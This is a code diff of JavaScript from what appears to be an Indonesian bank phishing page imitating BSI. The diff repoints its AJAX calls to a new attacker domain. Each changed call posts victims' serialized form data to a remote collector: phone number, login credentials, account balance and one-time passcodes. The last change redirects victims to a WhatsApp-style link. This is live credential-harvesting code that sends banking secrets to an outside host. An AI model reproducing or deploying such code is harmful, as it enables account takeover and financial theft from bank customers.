@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/f1gd/no.php',
+            url: 'https://anjayhostjon.cloud/bsi/9b1b/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/f1gd/login.php',
+            url: 'https://anjayhostjon.cloud/bsi/9b1b/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreo.cloud/bsi/f1gd/saldo.php',
+            url: 'https://anjayhostjon.cloud/bsi/9b1b/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreo.cloud/bsi/f1gd/otp.php',
+ url: 'https://anjayhostjon.cloud/bsi/9b1b/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,9 +123,9 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://choreo.cloud/wa/f1gd';
-    }, 1000);
+location.href='https://donasisekarang.wasap.my/';
+    }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
-    }, 1000);      
+    }, 5100);      
 }     
